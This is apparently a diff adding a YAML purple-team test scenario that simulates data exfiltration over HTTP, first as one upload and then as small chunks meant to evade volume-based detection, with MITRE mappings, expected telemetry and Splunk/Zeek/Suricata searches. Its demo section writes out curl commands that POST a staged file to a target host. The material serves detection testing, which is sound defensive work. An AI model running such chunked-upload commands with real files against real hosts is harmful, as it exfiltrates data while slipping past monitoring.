@@ -1,0 +1,97 @@
+scenario:
+  id: APTPACK-STAGE-SCN-001
+  name: Staging / Lateral / Exfiltration - Direct upload and chunked upload evasion
+  phase_code: STAGE
+  phase_directory: APTPACK-STAGE
+  cyber_kill_chain: staging_lateral_exfiltration
+  severity: critical
+  confidence: medium
+  status: ready_for_validation
+
+threat_model:
+  summary: >
+    Simulates exfiltration or staging transfer behavior using direct upload followed by
+    smaller chunked transfers to test volume-aware and evasion-aware analytics.
+  realistic_use_case: >
+    Mirrors cases where a first straightforward transfer is replaced by segmented uploads
+    to reduce suspicion.
+  attack_story: >
+    The operator pushes a single payload, then repeats the operation in smaller fragments.
+
+mitre:
+  tactics:
+    - TA0005
+    - TA0010
+  techniques:
+    - id: T1041
+      name: Exfiltration Over C2 Channel
+    - id: T1020
+      name: Automated Exfiltration
+
+metadata:
+  log_source:
+    - suricata_http
+    - zeek_http
+    - proxy_logs
+  test_ids:
+    corr: APTPACK-STAGE-CORR-001
+    anti: APTPACK-STAGE-ANTI-001
+  response_guidance:
+    - Compare total bytes, request count, and timing.
+    - Review whether chunking breaks expected application behavior.
+    - Pivot to file staging artifacts on source host.
+
+triggers:
+  correlation_rule_intent: >
+    Match direct upload request carrying stage correlation test_id.
+  anti_bypass_rule_intent: >
+    Match repeated chunked transfers carrying stage anti-bypass test_id.
+
+demo:
+  prerequisites:
+    - TARGET must accept or at least log HTTP POST requests.
+  commands:
+    - |
+      TMPFILE="/tmp/aptpack_stage_payload.txt"
+      echo "APTPACK STAGE TEST PAYLOAD APTPACK-STAGE-CORR-001" > "$TMPFILE"
+      curl -X POST --data-binary @"$TMPFILE" \
+        "http://$TARGET/upload?test_id=APTPACK-STAGE-CORR-001" || true
+    - |
+      TMPFILE="/tmp/aptpack_stage_payload.txt"
+      echo "APTPACK STAGE TEST PAYLOAD APTPACK-STAGE-ANTI-001" > "$TMPFILE"
+      split -b 20 "$TMPFILE" /tmp/stage_chunk_
+      for f in /tmp/stage_chunk_*; do
+        curl -X POST --data-binary @"$f" \
+          "http://$TARGET/upload_chunk?test_id=APTPACK-STAGE-ANTI-001" || true
+      done
+      rm -f /tmp/stage_chunk_*
+  safety_notes:
+    - Payload is plain text only.
+
+expected_telemetry:
+  suricata:
+    - POST requests for upload and upload_chunk paths
+  zeek:
+    - HTTP method POST with corresponding query strings
+  splunk:
+    - searchable by stage test IDs
+  wazuh:
+    - only if web logs are ingested
+
+dashboard_searches:
+  splunk:
+    - '("APTPACK-STAGE-CORR-001" OR "/upload")'
+    - '("APTPACK-STAGE-ANTI-001" OR "/upload_chunk")'
+  zeek_grep:
+    - 'grep -R "APTPACK-STAGE-CORR-001\|APTPACK-STAGE-ANTI-001\|upload_chunk" /opt/zeek/logs/current'
+  suricata_grep:
+    - 'grep -R "APTPACK-STAGE-CORR-001\|APTPACK-STAGE-ANTI-001\|upload_chunk" /var/log/suricata'
+
+validation:
+  pass_criteria:
+    - Direct upload visible as one distinct transaction.
+    - Chunked upload visible as multiple smaller transactions.
+    - Search terms distinguish correlation and anti-bypass runs.
+  fail_indicators:
+    - POST traffic never enters sensor path.
+    - Only client-side curl output exists.
